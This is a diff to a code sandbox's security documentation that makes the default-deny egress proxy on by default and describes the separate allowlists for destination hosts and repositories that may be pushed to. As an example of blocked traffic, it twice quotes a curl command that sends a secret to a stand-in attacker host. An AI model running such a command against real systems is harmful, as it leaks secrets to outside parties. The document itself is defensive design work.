@@ -421,9 +421,9 @@ The sandbox container **never receives a VCS token.** There is no opt-in flag: c
 
 This follows the principle of least privilege — the container's own `git`/`gh` stay unauthenticated, so a stray in-container `git push` has no credential to leak.
 
-### 2. Egress containment — the egress proxy (opt-in)
+### 2. Egress containment — the egress proxy (default-on)
 
-The egress proxy is enabled with `CODE_SANDBOX_ENABLE_EGRESS_PROXY=true` (staged rollout; **off by default**). When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. On top of that the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:
+The egress proxy is **enabled by default**. Set `CODE_SANDBOX_ENABLE_EGRESS_PROXY=false` to opt out. When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. On top of that the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:
 
 - **Where the sandbox may connect** — `CODE_SANDBOX_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries (see below); everything else is denied.
 - **Where the sandbox may write** — `CODE_SANDBOX_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.
